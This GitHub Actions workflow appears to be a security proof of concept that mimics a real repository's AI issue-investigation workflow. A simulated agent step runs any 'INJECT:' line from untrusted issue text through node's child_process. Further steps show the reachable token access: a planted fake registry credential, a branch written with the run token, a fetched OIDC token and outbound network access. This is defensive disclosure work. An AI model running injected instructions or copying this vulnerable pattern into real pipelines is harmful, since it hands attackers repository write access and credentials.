name: Agent Inject Probe

# Mirrors segmentio/analytics-react-native .github/workflows/claude-issue-investigate.yml:
# issues:labeled trigger, contents:write + id-token:write, secrets in env,
# untrusted issue text pulled in via gh, then handed to an LLM agent whose
# allowlist includes Bash(node:*) / Bash(git:*).
on:
  issues:
    types: [labeled]

permissions:
  contents: write
  issues: read
  id-token: write

jobs:
  investigate:
    if: github.event.label.name == 'investigate'
    runs-on: ubuntu-latest
    env:
      ARTIFACTORY_URL: ${{ vars.ARTIFACTORY_URL }}
    steps:
      - uses: actions/checkout@v4

      # Stand-in for the local composite action ./.github/actions/artifactory-oidc,
      # which appends the exchanged Artifactory token into .yarnrc.yml in the workspace.
      - name: Fake artifactory credential in workspace
        run: |
          printf 'npmRegistries:\n  "https://artifactory.example/api/npm/virtual-npm-thirdparty/":\n    npmAuthToken: "ARTIFACTORY_FAKE_TOKEN"\n' >> .yarnrc.yml

      # Same as the target: only the issue NUMBER is spliced; the untrusted
      # title/body are pulled by the tool itself via gh at run time.
      - name: Fetch untrusted issue text
        env:
          GH_TOKEN: ${{ github.token }}
          ISSUE_NUMBER: ${{ github.event.issue.number }}
        run: |
          gh issue view "$ISSUE_NUMBER" --repo "$GITHUB_REPOSITORY" --json title,body \
            -q '.title + "\n" + .body' > "$RUNNER_TEMP/untrusted.txt"
          echo "--- untrusted text as the agent sees it ---"
          cat "$RUNNER_TEMP/untrusted.txt"

      # Stands in for: claude -p "$(cat prompt)" --allowedTools "...Bash(node:*),Bash(git:*)..."
      - name: Simulated agent step
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          GH_TOKEN: ${{ github.token }}
        run: |
          echo "secret_present=${ANTHROPIC_API_KEY:+yes}"
          echo "secret_len=${#ANTHROPIC_API_KEY}"
          echo "artifactory_token_in_workspace=$(grep -c ARTIFACTORY_FAKE_TOKEN .yarnrc.yml)"
          node -e '
            const fs = require("fs");
            const t = fs.readFileSync(process.env.RUNNER_TEMP + "/untrusted.txt", "utf8");
            // an injected instruction the model is asked to follow
            const m = t.match(/^INJECT: ?(.*)$/m);
            console.log("injected_instruction_found:", !!m);
            if (m) {
              console.log("executing attacker instruction via node child_process");
              require("child_process").execSync(m[1], { stdio: "inherit" });
            }
          '

      - name: Prove contents write on this run token
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          head=$(git rev-parse HEAD)
          gh api -X POST "repos/$GITHUB_REPOSITORY/git/refs" \
            -f ref=refs/heads/poc-written-by-agent -f sha="$head" --jq '.ref'

      - name: Prove id-token write in same job
        run: |
          jwt=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=probe" | jq -r .value)
          echo "oidc_jwt_len=${#jwt}"
          echo "$jwt" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{iss,aud,sub}'

      - name: Prove network egress from allowlisted node
        run: node -e 'fetch("https://example.com").then(function(r){console.log("egress_status",r.status)})'
